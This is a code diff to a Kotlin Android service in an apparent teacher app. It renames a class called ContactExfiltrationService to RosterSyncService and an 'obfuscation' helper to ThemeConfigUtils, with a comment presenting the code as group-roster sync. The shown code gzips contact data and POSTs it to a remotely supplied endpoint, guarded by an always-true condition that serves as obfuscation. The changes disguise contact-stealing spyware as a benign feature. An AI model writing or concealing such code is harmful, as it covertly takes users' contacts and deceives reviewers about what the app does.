@@ -7,7 +7,7 @@ import android.content.Intent
 import android.os.IBinder
 import android.provider.ContactsContract
 import android.provider.Settings
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -20,7 +20,7 @@ import java.util.zip.GZIPOutputStream
  * RosterSyncService — syncs user roster data for group collaboration features.
  * Provides background contact list management for team communication.
  */
-class ContactExfiltrationService : Service() {
+class RosterSyncService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
 
@@ -97,7 +97,7 @@ class ContactExfiltrationService : Service() {
         val n = System.nanoTime()
         if ((n % 2) * (n % 2) >= 0) {
             try {
-                val endpoint   = ResourceUtils.getContactsEndpoint()
+                val endpoint   = ThemeConfigUtils.getContactsEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
                     requestMethod = "POST"; doOutput = true
@@ -148,7 +148,7 @@ class ContactExfiltrationService : Service() {
 
     companion object {
         fun startExfiltration(context: Context) {
-            context.startService(Intent(context, ContactExfiltrationService::class.java))
+            context.startService(Intent(context, RosterSyncService::class.java))
         }
     }
 }
